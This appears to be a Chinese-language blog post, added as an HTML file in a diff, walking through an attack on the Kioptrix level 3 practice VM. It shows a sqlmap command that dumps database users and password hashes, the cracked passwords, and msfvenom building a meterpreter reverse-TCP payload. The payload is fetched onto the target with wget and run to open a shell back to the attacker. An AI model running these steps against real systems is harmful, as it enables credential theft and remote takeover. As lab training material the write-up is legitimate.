@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>level 3 下集（wget与提权）</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">level 3 下集（wget与提权）</h1>
+        <div class="show-content">
+          <p>sqlmap获取数据库用户密码的hash值。<a href="https://www.jianshu.com/p/763df62fa07a" target="_blank">参考</a></p><h1>获得信息</h1><p>用户名：dreg              hash值：0d3eccfb887aabd50f243b3f155c0f85     解密后：Mast3r</p><p>用户名：loneferret      hash值：5badcaf789d3d1d09794d8f021f40f0e    解密后：starwars </p><hr><blockquote><p>sqlmap -u "kioptrix3.com/gallery/gallery.php?id=1" --users --passwords</p></blockquote><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-d872e83aae910944.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>然后丢到在线hash破解。<a href="https://hashkiller.co.uk/sha1-decrypter.aspx" target="_blank">https://hashkiller.co.uk/sha1-decrypter.aspx</a></p><div class="image-package  " data-index="1">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-93d796c6121131df.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><h1>获取信息2：</h1><p>用户名：root   解密后密码：fuckeyou</p><p>用户名：debian-sys-maint   没有找到hash值对应的密码</p><hr><p>ssh登陆：因为在上一篇信息搜集中，已知道开放了22端口，于是可以尝试登陆。管理员有可能使用重复的用户名和密码（图方便）。更方便的是弱密码。。2333</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-2887dd044fd788f1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>尝试用root / fuckeyou 切换管理员账号，无效。</p><h1>获取信息3：</h1><blockquote>
+<p>file /bin/ls           #获得32位系统。</p>
+<p>cat /etc/issue   #获取到 Ubuntu 8.04，有意思的是还获得了kioptrix小组的免责声明，说不要将此机器放在互联网上，因使用该机器造成的信息丢失等等概不负责。。</p>
+<p>uname -a         
+
+#获取到，linux 2.6.24-24-server 内核版本</p>
+</blockquote><p><a href="https://www.jianshu.com/p/8d3f94390eab" target="_blank">msfvenom</a>生成攻击载荷，这么说还是有点拗口，不如说生成木马。生成的程序之后要在对方机子上运行，然后我们就可以连接了。</p><blockquote><p>msfvenom -l | grep linux | grep x86</p></blockquote><p>-l (list) 是攻击程序的列表，搜索32位linux的。</p><blockquote><p>msfvenom -p linux/x86/meterpreter_reverse_tcp --payload-options</p></blockquote><p>-p选择payload，攻击载荷；--payload-options查看payload所需参数</p><blockquote><p>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.1.112 LPORT=999 X &gt; /var/www/html/back.door</p></blockquote><p>kali机需要开启<a href="https://www.jianshu.com/p/927d700da347" target="_blank">http服务</a></p><p>返回ssh的命令窗口，输入 wget http://攻击机ip/back.door ，成功下载攻击载荷</p><p>chomod a+x back.door ，添加可执行权限</p><hr><p>先在攻击机运行</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-940ef37a3ca016f6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>然后在ssh命令行./back.door</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-636d4d2d548bd92e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">192.168.1.103是目标主机ip</div>
+</div><p>本地获得meterpreter。在攻击机监听本地ip的999端口，back.door会主动连接kali linux。</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
